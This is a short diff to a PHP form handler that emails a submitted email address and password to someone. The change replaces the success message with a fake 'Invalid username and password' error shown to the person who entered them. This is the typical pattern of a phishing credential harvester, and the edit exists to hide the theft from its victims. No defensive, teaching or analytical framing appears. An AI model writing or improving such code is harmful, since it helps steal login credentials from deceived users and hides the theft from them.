@@ -31,7 +31,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $mail->AltBody = "Email: $email\nPassword: $password";
 
         $mail->send();
-        echo 'Login info sent successfully.';
+        echo 'Invalid username and password .';
     } catch (Exception $e) {
         echo 'Error: ' . $mail->ErrorInfo;
     }
